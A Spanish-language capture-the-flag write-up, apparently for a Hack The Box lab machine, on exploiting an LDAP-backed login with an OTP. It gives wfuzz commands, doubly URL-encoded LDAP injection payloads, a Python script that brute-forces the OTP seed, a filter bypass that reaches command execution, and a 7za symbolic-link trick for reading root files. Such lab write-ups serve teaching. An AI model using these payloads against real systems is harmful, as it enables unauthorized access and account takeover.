-------
- Tags: #ldap #ldap-injection #ldap-enumeration #OTP #python-scripting #python3 #symbolic-link 
-------
## Técnicas utilizadas
- LDAP Injection  
- LDAP Injection - Discovering valid usernames  
- LDAP Injection - Attribute Brute Force [Discovering valid LDAP fields]  
- LDAP Injection - Obtaining OTP Seed  
- Generating One-Time Password (OTP) [stoken]  
- Second Order Ldap Injection  
- Abusing backup - 7za Symbolic Links (Privilege Escalation)
## Procedimiento

![[Pasted image 20230628204204.png]]

------
#### Reconocimiento

Si lanzamos un escaneo con **nmap** podemos ver los siguientes puertos abiertos:
```ruby
# nmap -sCV -p22,80 10.10.10.122 -oN Ports
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-29 13:14 MST
Nmap scan report for 10.10.10.122
Host is up (0.13s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 fdadf7cbdc421e437db3d58bce63b90e (RSA)
|   256 3def345ce5175e06d7a4c886cae2dffb (ECDSA)
|_  256 4c46e2168a14f6f0aa396c9746dbb440 (ED25519)
80/tcp open  http    Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16)
|_http-title: CTF
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16
| http-methods: 
|_  Potentially risky methods: TRACE

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.11 seconds

```

Un escaneo con **whatweb** nos muestra las siguientes tecnologías corriendo por detrás del sitio web:
```ruby
# whatweb 10.10.10.122
http://10.10.10.122 [200 OK] Apache[2.4.6][mod_fcgid/2.3.9], Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[CentOS][Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16], IP[10.10.10.122], JQuery, OpenSSL[1.0.2k-fips], PHP[5.4.16], Script, Title[CTF]
```

Visitando la web, vemos que se nos deja un mensaje que nos avisa que no intentemos ninguno tipo de **Brute Force** porque nos van a banear durante **5 minutos**.

------
#### LDAP Injection 
Viendo la pagina principal, vemos una apartado para **iniciar sesión**. Si intentamos colocar un usuario, vemos un output que nos indica que nuestro usuario no existe. Esto puede ser via potencial para enumerar usuarios:
![[Pasted image 20230629133346.png]]


Si intentamos colocar algunos caracteres especiales, vemos que no los interpreta, esto podria darnos indicios de que quizás se este aconteciendo algún tipo de error por alguna inyeción.
Podemos intentar fuzzear los caracteres con **wfuzz** controlando el tiempo de input para evitar ser baneado como lo vimos en la maquina [[Most important - MultiMaster|Multimaster]] de la siguiente manera:''
```
# wfuzz -c --hh=404 -s 1 -X POST -w diccionario.txt -d "InputUsername=FUZZ&data=1" http://<ip>/  
```

Podemos ver distintos caracteres que la pagina especialmente no interpreta. Estos caracteres son tipicos en consultas **LDAP**, asi que podemos suponer que por detras se esta ejecutando algunas **querys** en algun servicio **LDAP**. Cabe mencionar, que los caracteres que vayamos a estar tramitando contra el **Login** tienes que estar en un formato doblemente urlencodeados. Esta es la estructura que probablemente se este ejecutando en la consulta:
```ruby
(&
	(&
		(inputOTP=123)
		(inputUsername=ad*)))%00
	)
---------- INCÓGNITA
	(&
		(exampla=example)
		(example=example)
	)
)
```

--------
#### LDAP Injection - Discovering valid usernames
Podemos intentar una inyección de la siguiente manera:
```
inputUsername=a%252a%2529%2529 %2500&inputOTP=0
```

Por la estructura, vemos que el unico caracter que no esta doblemente urlencodeado es la letra **"a"** por lo restante, el parantesis de abertura **"("** y el parantesis de cierre **")"** asi como el NULL byte **"%00"**  estan doblemente urlencodeados.
Ya que tenemos la estructura base para ejecutar inyecciónes, podemos intentar fuzzear letra por letra con **wfuzz**:
```
# wfuzz -c --hc=404 -u "http://<iP>/login.php" -d "inputUsername=a%252a%2529%2529 %2500&inputOTP=0" -w /usr/share/SecList/Fuzzing/char.txt
```

Con la respuesta obtenida, podemos ir sacando conclusiones. En las peticiones donde recibimos más de **2822** caracteres, probablemente sea descartables. Por otro lado, las peticiones que nos hayan regresado **2822** sea el caracter correcto. Guiandonos con este filtro, podemos ir obteniendo las siguientes letras.

Siguiendo estos pasos, podemos dar con un **usuario**:
![[Pasted image 20230629135657.png]]

----------
#### LDAP Injection - Attribute Brute Force [Discovering valid LDAP fields]  
Ahora que tenemos un nombre de usuario valido, podriamos fuzzear por atributos validos, la consulta de la inyección va a cambiar, lo que queremos lograr ahora seria esto:
```
(&
	(&
		(inputOTP=123)
		(inputUsername=ldap)
		(attribute=*)))%00
	)
---------- INCÓGNITA
	(&
		(exampla=example)
		(example=example)
	)
)
```

Vamos abrir un **"("** y a su vez cerrarlo **")"** y dentro de este vamos a fuzzear por atributos existentes. La data doblemente urlencodeada se veria asi:
```
inputUsername=ldapuser%2529%2520%2528FUZZ%253d%252a%2529%2529%2529%2500
```

Vemos algunos atributos disponibles:
![[Pasted image 20230629145214.png]]

--------------
#### LDAP Injection - Obtaining OTP Seed
Ahora podemos iterar por cada uno de ellos con **wfuzz** de la misma forma que habiamos hecho el anterior:
```
# wfuzz -c --hw=233 --hc=404 -w digits -d 'inputUsername=ldapuser%2529%2520%2528pager%253dFUZZ%252a%2529%2529%2529%2500&inputOTP=123'
```

Terminando la fuerza bruta, podemos dar con el **OTP** integro:
```
Image
```

Tambien podemos hacer un script con **python3** para fuzzear por todos los digitos y ahorrarnos ese tiempo:
```python

from pwn import *
import requests
import pdb
import time
import signal
import sys
import string

# ctrl + c
def def_handler(sig,frame):
	print("\n[!] Saliendo....")
	sys.exit(1)
signal.signal(signal.SIGINT, def_handler)

# Variables globales
main_url = "http://<iP>/login.php"
digits = string.digits
atributo = "pager"

# Funciones
def makeRequest():

	token = ""
	p1 = log.progress("ldap injection")
	p1.status("iniciando ataque de fuerza bruta")

	time.sleep(2)

	p2 = log.progres("TOKEN")
	for position in range(0, 81):
		for digit in digits:

			post_data = {			
				'inputUsername' : f'ldapuser%29%28{atributo}%3d{token}{digit}%2a%29%29%29%00,
				"inputOTP" : '123'
			}

			p1.status(f"Probando con el digito {digit} en la posicion [{position}]: {post_data['inputUsername']}")
			r = requests.post(main_url, data=post_data)

			if "Cannot login" in r.text:
				token += digit
				p2.status(token)
				break
			time.sleep(1)

if __name__ == "__main__":
	
	makeRequest()
```

-----------
#### Generating One-Time Password (OTP) [stoken]  
Con el token dumpeado, podemos crear un **OTP** con la herramienta **stoken** de la siguiente manera:
```
stoken --token=<TOKEN>
```

Nos pedira un **PIN**, podemos simplemente dejarlo vacio o poner como input **0000** y esto nos va a generar el **OTP**:
![[Pasted image 20230629153400.png]]

----------
#### Second Order Ldap Injection
Una vez dentro del dashboard, podemos ver que que hay ejecución remota de comandos en un campo **CMD** y nos pide a su vez el **OTP** que podemos estar generando infinitamente con **stoken**:
![[Pasted image 20230629153451.png]]

Vemos que cuando intentamos ejecutar un comando, nos manda el siguiente mensaje que nos indica que no tenemos permisos ya que debemos pertenecer al grupo **adm** o **root**:
![[Pasted image 20230629153521.png]]

Podemos burlar esta comparación. Tenemos que cerrar **parentesis** y dejar el **NULL** byte de la siguiente manera:
```
ldapuser)))%00
```

Esto lo tenemos que doblemente urlencodear y quedaria asi:
```
ldapuser%2529%2529%2529%2500
```

Podemos logearnos a través de **burpsuite** para no tener problemas con los caracteres especiales.
Una vez dentro, ahora si podemos ejecutar comandos:
![[Pasted image 20230629154926.png]]

Ahora con la ejecución remota de comando podemos entablarnos una revershell a nuestra maquina.

--------
#### Abusing backup - 7za Symbolic Links (Privilege Escalation)
Enumerando la maquina, vemos que hay una carpeta */var/backup* que contiene un archivo de nombre **honeyspot.sh**. En este archivo vemos que basicamente agarra todo lo que hay en **/var/www/html/uploads** lo comprime y lo mete en **/var/backup**, hay una linea que define que todo aquellos errores, los almacena en *error.log*

Bueno, para abuzar de esto, tenemos que aprovecharnos de que en **7za** hay una manera de indicar que lea de un archivo el cual contiene rutas a comprimir. Si creamos un archivo de nombre **@example** y posteriormente creamos un enlace simbolico de **/root/root.txt** al archivo **example** creara un error y este error se almacenara en *error.log*.

Podemos estar contantemente viendo la ultima linea de *error.log* con *tail -f error.log*.